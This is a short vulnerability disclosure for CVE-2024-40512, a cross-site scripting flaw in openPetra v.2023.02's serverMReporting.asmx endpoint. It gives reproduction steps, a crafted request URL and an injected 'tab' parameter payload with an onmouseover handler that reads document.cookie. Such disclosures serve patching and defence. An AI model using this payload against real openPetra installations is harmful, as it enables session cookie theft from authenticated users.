# CVE-2024-40512
# Cross Site Scripting vulnerability in openPetra v.2023.02 via the serverMReporting.asmx function.

**Description**: An unauthenticated user can steal cookies from authenticated user, by exploiting a XSS in openPetra v.2023.02 via the serverMReporting.asmx function.

**Vulnerable Product Version**: openPetra v.2023.02  
**CVE Author**: Jansen Moreira 
**Date**: 13/07/2024  
**CVE**: CVE-2024-40512  
**CVE Link**: https://www.cve.org/CVERecord?id=CVE-2024-40512  
**NVD Link**: https://nvd.nist.gov/vuln/detail/CVE-2024-40512     
**Tenable Link**: https://www.tenable.com/cve/CVE-2024-40512  
**Confirmed on**: 13/07/2024                               
**Tested on**: Linux  
### Steps to reproduce:  
1- Access the home Page  
2- Use the following path and add the xss payload in the tab parametrer. EX.:  ```http://target.com/api/serverMReporting.asmx?bnd=TMReportingWebServiceSoap&op=TReportGeneratorWebConnector_GetProgress&page=op&tab=x" onmouseover=alert(document.cookie) x="```         
3- Hover the mouse over the left index item to trigger the XSS  

**Payloads**:  
tab: x" onmouseover=alert(document.cookie) x="


Discoverer(s)/Credits:
Jansen Moreira 
